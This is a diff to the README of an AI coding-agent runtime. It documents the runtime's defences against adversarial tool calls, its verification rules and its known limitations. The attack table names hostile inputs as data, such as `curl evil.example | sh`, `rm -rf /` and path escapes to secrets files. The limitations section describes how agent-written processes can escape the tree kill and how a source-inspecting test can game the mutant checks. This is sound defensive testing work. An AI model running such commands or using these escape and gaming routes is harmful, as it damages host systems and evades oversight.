@@ -36,7 +36,7 @@ addresses all three explicitly:
 |---|---|
 | Malformed tool call | `ToolSpec` schema validation (types, ranges, size caps); rejects with structured errors recorded in the trace |
 | Arbitrary shell access | no shell tool; `run_tests` accepts only `python -m pytest` with allowlisted flags and workspace test paths, runs the runtime's own interpreter without a shell, with a scrubbed environment, a deadline and a process-tree kill |
-| Unverified claims | VERIFY restores protected files and re-runs the suite itself; COMPLETE needs exit status 0 plus a test report with passing tests, and seeded mutants must fail on the add-a-test task |
+| Unverified claims | VERIFY restores protected files and re-runs the suite itself; COMPLETE needs exit status 0 plus a test report with passing tests, and on the add-a-test task seeded mutants must fail while behaviour-preserving edits still pass |
 | Path escapes | paths are checked as text before any filesystem access, then must be direct paths inside the workspace (no links); `.git`, pytest control files and task-protected paths are read-only |
 | Infinite loops | step budget + replan budget + planner-error budget -> FAILED |
 
@@ -96,24 +96,26 @@ computed from those recorded counters, as its `notes` field explains. API keys
 come from environment variables, are withheld from test processes and are
 redacted from observations, traces and prompts.
 
-**Adversarial tool calls: 36 attempts, 0 breaches.**
-`python scripts/run_jail_attacks.py` replays 36 hostile calls against a real
+**Adversarial tool calls: 39 attempts, 0 breaches.**
+`python scripts/run_jail_attacks.py` replays 39 hostile calls against a real
 `ToolRegistry` and writes `results/jail_attack_evidence.json`; a test reruns
 them and requires that file to match exactly. 29 are rejected before anything
-runs, 6 run but gain nothing (the evidence records what was checked), and 1 is
-the documented residual.
+runs, 9 run but gain nothing (the evidence records what was checked), and 1 is
+the documented residual. Three of the attacks come from an independent review
+of the hardened runtime, which also found the issues fixed in the last round
+of commits (see the git log).
 
 | category | examples | outcome |
 |---|---|---|
 | path escape | `../secrets.txt`, `C:/Windows/win.ini`, a UNC path, a `\\?\` device path, a glob above the root | rejected (6) |
 | shell commands | `curl evil.example \| sh`, `rm -rf /` | rejected (2) |
-| malformed calls | `path=123`, an unknown tool, a boolean line number | rejected (3) |
-| test command abuse | `python -m pytestx`, `--junitxml=../x`, `-p plugin`, `--basetemp=../x`, `-c ../x`, `../outside_pkg`, `@args.txt`, `; rm -rf /` | rejected (8) |
+| malformed calls | `path=123`, an unknown tool, a boolean line number; a regex that overflows the compiler | rejected (3), contained (1) |
+| test command abuse | `python -m pytestx`, `--junitxml=../x`, `-p plugin`, `--basetemp=../x`, `-c ../x`, `../outside_pkg`, `@args.txt`, `; rm -rf /`; a workspace file named `@argfile` | rejected (8), contained (1) |
 | path aliases | `app.py:hidden` (NTFS stream), `app.py. `, `CON` | rejected (3) |
 | git metadata | writing or editing `.git/config`; `git_diff` in a repo whose config runs a hook | rejected (2), contained (1) |
 | links | reading or writing through a directory link; `search` and `list_tree` across it | rejected (2), contained (3) |
 | verification tampering | planting `conftest.py`, editing a protected test | rejected (2) |
-| resource limits | a 1 MB+ file, a catastrophic regex | rejected (1), contained (1) |
+| resource limits | a 1 MB+ file, a catastrophic regex, nested `**` globs over a deep tree | rejected (1), contained (2) |
 | credentials | test code reading an API key from the environment | contained (1) |
 | agent-written test code | a test that writes a file outside the workspace | **residual (1)**: it succeeds, as documented above |
 
@@ -170,7 +172,7 @@ flowchart TD
 flowchart LR
     OBS["OBSERVE / planner says done"] --> RES["restore protected files<br/>and pytest control files"]
     RES --> VER{"VERIFY: run suite,<br/>exit 0 + passing report?"}
-    VER -->|"yes (and every seeded<br/>mutant is caught)"| DONE["COMPLETE"]
+    VER -->|"yes (mutants caught,<br/>neutral edits pass)"| DONE["COMPLETE"]
     VER -->|"no"| REP["REPLAN (budget-limited)"]
     REP --> PLAN["PLAN"]
     REP -->|"replans exhausted"| FAIL["FAILED"]
@@ -215,7 +217,8 @@ Components (src/repo_engineer/):
   configuration) and `RecordedPlanner` (test double).
 - `agent.py`: `AgentRuntime`, the loop described above, plus JSON trace export.
 - `benchmark/`: the harness, the four task repos (with protected paths and,
-  for the add-a-test task, seeded mutants), the live-run recorder and the
+  for the add-a-test task, seeded mutants and behaviour-preserving edits),
+  the live-run recorder and the
   jail-attack generator.
 
 ## Technical Report
@@ -229,11 +232,16 @@ with LaTeX source included under `reports/`.
 - Test execution is code execution. Agent-written tests run as the host user
   with the host's filesystem and network access; the runtime's controls
   (environment allowlist, deadline, tree kill, output bound) protect the
-  runtime, not the host. On POSIX a process that starts its own session also
-  escapes the tree kill. An OS-level sandbox is the planned fix.
+  runtime, not the host. A process that leaves the tree on purpose (one that
+  starts its own session on POSIX, or one created through a service such as
+  WMI on Windows) also outlives the tree kill. An OS-level sandbox is the
+  planned fix.
 - The scripted benchmark replays known fixes; it measures the runtime, not
   problem solving. The live run is the problem-solving evidence and is small:
   two tasks, once each, on an earlier runtime revision.
+- On the add-a-test task, a test that inspects the source text of the code
+  under test (rather than its behaviour) can still pass the mutant and
+  neutral-edit checks; that takes deliberate gaming.
 - Write-time link checks narrow, but do not close, the race with a
   concurrent process (such as leftover test code) that swaps a directory for
   a link.
@@ -246,9 +254,9 @@ with LaTeX source included under `reports/`.
 
 ```bash
 python -m pip install -e ".[dev]"
-python -m pytest -q                    # 181 tests (180 on Linux: one case is Windows-only)
+python -m pytest -q                    # 205 tests (204 on Linux: one case is Windows-only)
 python scripts/run_benchmark.py        # 4/4 tasks; rewrites results/ byte for byte
-python scripts/run_jail_attacks.py     # 36 attacks, 0 breaches; rewrites the evidence file
+python scripts/run_jail_attacks.py     # 39 attacks, 0 breaches; rewrites the evidence file
 ruff check . && ruff format --check . && pyright
 ```
 
